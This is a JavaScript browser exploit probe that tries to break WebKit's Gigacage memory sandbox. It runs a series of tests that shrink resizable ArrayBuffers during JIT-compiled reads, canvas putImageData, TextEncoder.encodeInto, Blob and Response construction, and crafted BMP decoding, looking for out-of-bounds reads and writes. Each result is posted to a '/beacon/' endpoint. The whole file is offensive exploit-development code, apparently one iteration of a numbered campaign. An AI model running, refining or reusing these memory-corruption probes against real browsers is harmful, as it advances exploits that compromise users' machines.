/* p78-break — Break the Gigacage wall via native code paths
 *
 * The JS-level OOB stays in Gigacage. But NATIVE CODE that reads from
 * our RAB-backed typed array might not re-check bounds after resize.
 * Native writes go to non-Gigacage memory (WebCore heap, canvas memory, etc.)
 *
 * STRATEGY 1: DFG JIT type confusion
 *   Train DFG on non-RAB array → swap in RAB → resize → JIT code OOB
 *
 * STRATEGY 2: Canvas putImageData + RAB resize
 *   putImageData reads from ImageData's Uint8ClampedArray.
 *   If backed by RAB, resize during native read → OOB into canvas memory
 *
 * STRATEGY 3: createImageBitmap from RAB Blob
 *   Image parser reads from Blob backed by RAB data.
 *   Native parser might OOB.
 *
 * STRATEGY 4: TextDecoder stream + RAB resize
 *   TextDecoder.decode() reads from typed array. Resize mid-decode?
 *
 * Beacon prefix: V78B-
 */
(function(){
"use strict";
var RUN_ID = "v78b" + Math.random().toString(36).slice(2,12);
var PREFIX = "V78B-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press78-wall breaker v2");

/* ====== J1: DFG JIT type confusion ====== */
function test_J1() {
  var r = {};
  try {
    // Train DFG on a FIXED (non-RAB) typed array
    function hotRead(arr, idx) { return arr[idx]; }
    function hotWrite(arr, idx, val) { arr[idx] = val; }

    var fixed = new Uint8Array(256);
    for (var i = 0; i < 256; i++) fixed[i] = i;

    // Warm up DFG — call >10000 times
    var sum = 0;
    for (var w = 0; w < 20000; w++) {
      sum += hotRead(fixed, w & 0xFF);
      hotWrite(fixed, w & 0xFF, w & 0xFF);
    }
    r.warmup = sum;

    // Now create RAB-backed array, same type
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var rabView = new Uint8Array(rab);
    for (var j = 0; j < 256; j++) rabView[j] = 0xBB;

    // DFG should have compiled hotRead/hotWrite for non-RAB Uint8Array
    // Now pass RAB-backed array — if DFG doesn't bailout, it uses fixed bounds
    var preResize = hotRead(rabView, 200); // should work, within bounds
    r.preResize = preResize;

    // Shrink the RAB
    rab.resize(16);

    // Now access index 200 — past shrunk size but within original 256
    // If DFG compiled code uses cached length=256 → reads OOB
    var postResize = hotRead(rabView, 200);
    r.postResize = postResize;
    r.postIsUndef = postResize === undefined;

    // If postResize is NOT undefined, DFG is using stale bounds!
    r.JIT_OOB = postResize !== undefined && postResize !== 0;

    // Also test write
    try {
      hotWrite(rabView, 100, 0xDD);
      // Read it back — if rab is shrunk to 16, index 100 should be undefined
      var wb = rabView[100];
      r.writeBack = wb;
      r.JIT_WRITE_OOB = wb === 0xDD;
    } catch(e) {
      r.writeErr = e.message.slice(0,40);
    }

    // More aggressive: train with specific length checks eliminated
    function hotSum(arr) {
      var s = 0;
      var len = arr.length;
      for (var k = 0; k < len; k++) s += arr[k];
      return s;
    }
    // Warm up hotSum
    for (var q = 0; q < 10000; q++) hotSum(fixed);

    // RAB shrunk to 16, but hotSum captures arr.length at call time
    // Actually arr.length is re-read per call, but DFG might inline it
    rab.resize(256); // grow back
    for (var m = 0; m < 256; m++) rabView[m] = 1;
    var s1 = hotSum(rabView); // should be 256
    r.sumFull = s1;

    // Now shrink and call in rapid succession
    rab.resize(16);
    var s2 = hotSum(rabView); // DFG reads .length — does it get 16 or 256?
    r.sumShrunk = s2;
    r.SUM_OOB = s2 > 16; // if >16, DFG used stale length

  } catch(e) { r.err = e.message.slice(0,80); }
  B("J1-DFG-CONFUSE", r);
}

/* ====== J2: DFG with Proxy + RAB ====== */
function test_J2() {
  var r = {};
  try {
    // More sophisticated: use a Proxy that looks like a regular array
    // to confuse DFG profiling, then switch to RAB view

    var rab = new ArrayBuffer(1024, { maxByteLength: 1024 });
    var view = new Uint8Array(rab);
    for (var i = 0; i < 1024; i++) view[i] = i & 0xFF;

    // Function that reads .length then iterates
    function readChunk(arr, start, count) {
      var result = 0;
      for (var j = start; j < start + count && j < arr.length; j++) {
        result += arr[j];
      }
      return result;
    }

    // Warm with RAB view (normal size)
    for (var w = 0; w < 15000; w++) {
      readChunk(view, 0, 128);
    }
    r.warmOK = true;

    // Now: resize to small, then call readChunk with large range
    rab.resize(32);
    var result = readChunk(view, 0, 512);
    r.afterShrink = result;
    r.viewLen = view.length; // should be 32

    // Did readChunk read past 32?
    // If DFG cached arr.length = 1024 from warmup, it iterates to 512
    // Each read past 32 returns undefined → adds NaN → result is NaN
    r.isNaN = isNaN(result);
    r.STALE_LEN = !isNaN(result) && result > 0;

    // Alternative: use a function that doesn't check .length, uses constant
    function readFixed128(arr) {
      var s = 0;
      for (var k = 0; k < 128; k++) s += arr[k];
      return s;
    }

    rab.resize(1024);
    for (var w2 = 0; w2 < 15000; w2++) readFixed128(view);
    rab.resize(16);
    var r2 = readFixed128(view);
    r.fixed128afterShrink = r2;
    r.isNaN2 = isNaN(r2);
    // If DFG eliminated bounds check for arr[k] when k<128<1024...
    // After shrink to 16, indices 16-127 are OOB
    // DFG should bailout because RAB view, but maybe not?

  } catch(e) { r.err = e.message.slice(0,80); }
  B("J2-DFG-PROXY", r);
}

/* ====== C1: Canvas putImageData with RAB-backed data ====== */
function test_C1() {
  var r = {};
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 64;
    canvas.height = 64;
    var ctx = canvas.getContext('2d');
    r.ctxOK = !!ctx;

    // Create RAB-backed Uint8ClampedArray for ImageData
    var rab = new ArrayBuffer(64*64*4, { maxByteLength: 64*64*4 });
    var clamped = new Uint8ClampedArray(rab);
    for (var i = 0; i < clamped.length; i++) clamped[i] = i & 0xFF;

    // Try to create ImageData from RAB-backed array
    try {
      var imgData = new ImageData(clamped, 64, 64);
      r.imgDataOK = true;
      r.imgDataLen = imgData.data.length;

      // putImageData reads from imgData.data (our RAB-backed clamped array)
      // What if we resize DURING putImageData?
      // We can't directly — putImageData is synchronous.
      // But we can shrink BEFORE putImageData and check behavior

      rab.resize(256); // shrink to 256 bytes (only 64 pixels worth)
      try {
        ctx.putImageData(imgData, 0, 0);
        r.putAfterShrink = "OK";
      } catch(e) {
        r.putAfterShrinkErr = e.name + ":" + e.message.slice(0,40);
      }

      // Read back the canvas pixels
      var readBack = ctx.getImageData(0, 0, 64, 64);
      var nonZero = 0;
      var sample = [];
      for (var j = 256; j < readBack.data.length; j++) {
        if (readBack.data[j] !== 0) {
          nonZero++;
          if (sample.length < 10) sample.push(j + ":" + readBack.data[j]);
        }
      }
      r.nonZeroPastShrink = nonZero;
      r.sample = sample.join(",");
      r.CANVAS_OOB = nonZero > 0; // data written past shrunk boundary

    } catch(e) {
      r.imgDataErr = e.name + ":" + e.message.slice(0,40);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("C1-CANVAS", r);
}

/* ====== C2: Canvas via setter callback ====== */
function test_C2() {
  var r = {};
  try {
    // toDataURL → encodes canvas as base64.
    // What if we trigger encoding while RAB is being resized?

    var canvas = document.createElement('canvas');
    canvas.width = 32;
    canvas.height = 32;
    var ctx = canvas.getContext('2d');

    // Draw something
    ctx.fillStyle = '#FF0000';
    ctx.fillRect(0, 0, 32, 32);

    // toBlob is async — callback fires after encoding
    r.hasToBlobCb = typeof canvas.toBlob === 'function';

    // Test: can we create an ImageData from a regular buffer, then
    // swap the prototype to make it look like it has a different backing?
    // This is prototype pollution territory
    var ab = new ArrayBuffer(32*32*4);
    var u8c = new Uint8ClampedArray(ab);
    for (var i = 0; i < u8c.length; i++) u8c[i] = 0xAA;

    var imgData = new ImageData(u8c, 32, 32);
    ctx.putImageData(imgData, 0, 0);

    // Read back
    var rb = ctx.getImageData(0, 0, 32, 32);
    r.firstPixel = [rb.data[0], rb.data[1], rb.data[2], rb.data[3]].join(",");
    r.canvasWorks = rb.data[0] === 0xAA;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("C2-CANVAS-PROTO", r);
}

/* ====== T1: TextDecoder + RAB resize ====== */
function test_T1() {
  var r = {};
  try {
    var decoder = new TextDecoder('utf-8');
    r.decoderOK = true;

    var rab = new ArrayBuffer(1024, { maxByteLength: 1024 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 1024; i++) u8[i] = 0x41 + (i % 26); // 'A'-'Z' repeating

    // Decode with RAB-backed view — should work normally
    var str1 = decoder.decode(u8);
    r.strLen = str1.length;

    // Shrink then decode
    rab.resize(32);
    var str2 = decoder.decode(u8);
    r.shrunkLen = str2.length; // should be 32

    // What about decode({stream: true}) in pieces?
    rab.resize(1024);
    for (var j = 0; j < 1024; j++) u8[j] = 0x41 + (j % 26);

    var decoder2 = new TextDecoder('utf-8');
    var part1 = decoder2.decode(u8.subarray(0, 512), {stream: true});
    // Shrink between stream calls
    rab.resize(64);
    var part2 = decoder2.decode(u8.subarray(0, u8.length), {stream: false});
    r.streamPart1 = part1.length;
    r.streamPart2 = part2.length;

    // If TextDecoder internally cached a pointer from part1 and reuses it...
    r.STREAM_BUG = part2.length > 64;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("T1-TEXTDEC", r);
}

/* ====== T2: TextEncoder + RAB ====== */
function test_T2() {
  var r = {};
  try {
    var encoder = new TextEncoder();

    // encodeInto writes UTF-8 bytes into a destination Uint8Array
    // If destination is RAB-backed and we resize during encodeInto...
    var rab = new ArrayBuffer(1024, { maxByteLength: 1024 });
    var dest = new Uint8Array(rab);

    // Normal encode
    var result1 = encoder.encodeInto("Hello World!", dest);
    r.written1 = result1.written;

    // Now: create a large string, start encoding, resize mid-way
    // encodeInto is synchronous — can't resize during it
    // But what about valueOf on the source string?

    var bigStr = "A".repeat(512);
    var obj = { toString: function() {
      rab.resize(16); // shrink destination
      return bigStr;
    }};

    try {
      var result2 = encoder.encodeInto(obj, dest);
      r.written2 = result2.written;
      r.read2 = result2.read;
      r.destLen = dest.length; // should be 16 now
      r.ENCODE_OOB = result2.written > 16;

      // Check: did encodeInto write past byte 16?
      rab.resize(1024); // grow back
      var leakedBytes = 0;
      for (var i = 16; i < 512; i++) {
        if (dest[i] !== 0) { // non-zero = encodeInto wrote here
          leakedBytes++;
        }
      }
      r.leakedBytes = leakedBytes;
      r.WRITE_PAST_SHRINK = leakedBytes > 0;

    } catch(e) {
      r.encodeErr = e.name + ":" + e.message.slice(0,40);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("T2-TEXTENC", r);
}

/* ====== B1: Blob from RAB + createObjectURL ====== */
function test_B1() {
  var r = {};
  try {
    // Create a Blob from multiple sources, one of which resizes during iteration
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) u8[i] = 0xCC;

    // Blob constructor iterates array of parts
    // Each part is converted to bytes. What if during conversion of part2,
    // we resize the RAB that part1 came from?

    var resized = false;
    var fakePart = {
      // Symbol.toPrimitive or toString for Blob part conversion
      toString: function() {
        if (!resized) {
          rab.resize(16); // shrink source RAB
          resized = true;
        }
        return "trigger";
      }
    };

    try {
      // Blob([u8, fakePart]) — does it snapshot u8 eagerly or lazily?
      var blob = new Blob([u8, fakePart]);
      r.blobSize = blob.size;
      // If blob includes 512 bytes from u8 (pre-shrink) + "trigger"...
      // or 16 bytes (post-shrink) + "trigger"
      r.expectedShrunk = 16 + 7; // "trigger" = 7 bytes
      r.expectedFull = 512 + 7;
      r.BLOB_TOCTOU = blob.size > 100; // if >100, blob got pre-shrink data

      // Read the blob to verify
      var reader = new FileReader();
      reader.onload = function() {
        var ab = reader.result;
        var v = new Uint8Array(ab);
        var r2 = {};
        r2.readLen = v.length;
        r2.byte0 = v[0];
        r2.byte15 = v[15];
        if (v.length > 20) {
          r2.byte20 = v[20]; // past shrunk boundary — should be 0xCC if TOCTOU
          r2.byte100 = v.length > 100 ? v[100] : -1;
          r2.DATA_PAST_SHRINK = v[20] === 0xCC;
        }
        B("B1-BLOB-READ", r2);
      };
      reader.readAsArrayBuffer(blob);

    } catch(e) {
      r.blobErr = e.name + ":" + e.message.slice(0,40);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("B1-BLOB", r);
}

/* ====== B2: Response constructor from RAB ====== */
function test_B2() {
  var r = {};
  try {
    // Response(body) where body is a ReadableStream backed by RAB
    // The Response reads from the stream — can we resize during the read?

    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) u8[i] = 0xAA;

    // Direct: Response from typed array
    try {
      var resp = new Response(u8);
      rab.resize(16); // shrink after Response created but before body read

      resp.arrayBuffer().then(function(ab) {
        var v = new Uint8Array(ab);
        var r2 = {};
        r2.respLen = v.length;
        r2.byte0 = v[0];
        if (v.length > 20) {
          r2.byte20 = v[20];
          r2.RESP_TOCTOU = v[20] === 0xAA;
        }
        r2.RESP_STALE = v.length > 16;
        B("B2-RESP-READ", r2);
      }).catch(function(e) {
        B("B2-RESP-ERR", e.message.slice(0,80));
      });

      r.respOK = true;
    } catch(e) {
      r.respErr = e.name + ":" + e.message.slice(0,40);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("B2-RESP", r);
}

/* ====== I1: createImageBitmap from crafted BMP ====== */
function test_I1() {
  var r = {};
  try {
    // Craft a minimal BMP in an ArrayBuffer, parse it with createImageBitmap
    // BMP header: 54 bytes for 24-bit BMP
    var width = 64, height = 64;
    var rowSize = Math.ceil(width * 3 / 4) * 4; // rows padded to 4 bytes
    var pixelDataSize = rowSize * height;
    var fileSize = 54 + pixelDataSize;

    var buf = new ArrayBuffer(fileSize);
    var dv = new DataView(buf);
    var u8 = new Uint8Array(buf);

    // BMP header
    dv.setUint8(0, 0x42); dv.setUint8(1, 0x4D); // 'BM'
    dv.setUint32(2, fileSize, true);
    dv.setUint32(10, 54, true); // pixel data offset
    // DIB header (BITMAPINFOHEADER)
    dv.setUint32(14, 40, true); // header size
    dv.setInt32(18, width, true);
    dv.setInt32(22, height, true);
    dv.setUint16(26, 1, true); // planes
    dv.setUint16(28, 24, true); // bpp
    dv.setUint32(34, pixelDataSize, true);

    // Fill pixel data with marker pattern
    for (var i = 54; i < fileSize; i++) u8[i] = i & 0xFF;

    var blob = new Blob([buf], { type: 'image/bmp' });

    createImageBitmap(blob).then(function(bmp) {
      r.bmpWidth = bmp.width;
      r.bmpHeight = bmp.height;
      r.PARSE_OK = true;

      // Draw to canvas and read back pixels
      var c = document.createElement('canvas');
      c.width = width; c.height = height;
      var ctx = c.getContext('2d');
      ctx.drawImage(bmp, 0, 0);
      var pix = ctx.getImageData(0, 0, width, height);
      r.pixel0 = [pix.data[0], pix.data[1], pix.data[2], pix.data[3]].join(",");
      r.pixelLast = [pix.data[pix.data.length-4], pix.data[pix.data.length-3],
                     pix.data[pix.data.length-2], pix.data[pix.data.length-1]].join(",");
      B("I1-BMP-PARSE", r);
    }).catch(function(e) {
      r.parseErr = e.name + ":" + e.message.slice(0,60);
      B("I1-BMP-PARSE", r);
    });

    r.blobOK = true;
  } catch(e) { r.err = e.message.slice(0,80); }
  B("I1-BMP", r);
}

/* ====== I2: createImageBitmap from RAB Blob + resize ====== */
function test_I2() {
  var r = {};
  try {
    var width = 32, height = 32;
    var rowSize = Math.ceil(width * 3 / 4) * 4;
    var pixelDataSize = rowSize * height;
    var fileSize = 54 + pixelDataSize;

    // Use RAB so we can resize
    var rab = new ArrayBuffer(fileSize, { maxByteLength: fileSize });
    var dv = new DataView(rab);
    var u8 = new Uint8Array(rab);

    // BMP header
    dv.setUint8(0, 0x42); dv.setUint8(1, 0x4D);
    dv.setUint32(2, fileSize, true);
    dv.setUint32(10, 54, true);
    dv.setUint32(14, 40, true);
    dv.setInt32(18, width, true);
    dv.setInt32(22, height, true);
    dv.setUint16(26, 1, true);
    dv.setUint16(28, 24, true);
    dv.setUint32(34, pixelDataSize, true);
    for (var i = 54; i < fileSize; i++) u8[i] = 0xDD;

    // Create blob from RAB, then shrink RAB
    var blob = new Blob([u8], { type: 'image/bmp' });
    r.blobSize = blob.size;

    // Shrink RAB — does the blob still have the old data?
    rab.resize(64);

    createImageBitmap(blob).then(function(bmp) {
      r.bmpWidth = bmp.width;
      r.bmpHeight = bmp.height;
      r.PARSE_AFTER_SHRINK = true;
      B("I2-RAB-BMP", r);
    }).catch(function(e) {
      r.parseErr = e.name + ":" + e.message.slice(0,60);
      B("I2-RAB-BMP", r);
    });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("I2-RAB-BMP-INIT", r);
}

/* ====== Run ====== */
try {
  test_J1();
  setTimeout(test_J2, 400);
  setTimeout(test_C1, 800);
  setTimeout(test_C2, 1200);
  setTimeout(test_T1, 1600);
  setTimeout(test_T2, 2000);
  setTimeout(test_B1, 2400);
  setTimeout(test_B2, 2800);
  setTimeout(test_I1, 3200);
  setTimeout(test_I2, 3600);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2500);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe78-done"); }, 25000);
})();
